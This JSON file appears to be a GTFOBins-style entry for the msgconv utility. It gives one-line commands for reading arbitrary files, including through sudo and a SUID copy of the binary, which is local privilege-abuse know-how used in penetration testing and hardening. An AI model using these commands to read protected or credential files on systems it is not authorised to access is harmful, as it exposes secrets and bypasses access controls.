{
  "functions": {
    "file-read": [
      {
        
        "code": "LFILE=file_to_read\nmsgconv -P $LFILE\n"
      }
    ],
    "sudo": [
      {
        
        "code": "LFILE=file_to_read\nsudo msgconv -P $LFILE\n"
      }
    ],
    "suid": [
      {
        
        "code": "LFILE=file_to_read\n./msgconv -P $LFILE\n"
      }
    ]
  }
}
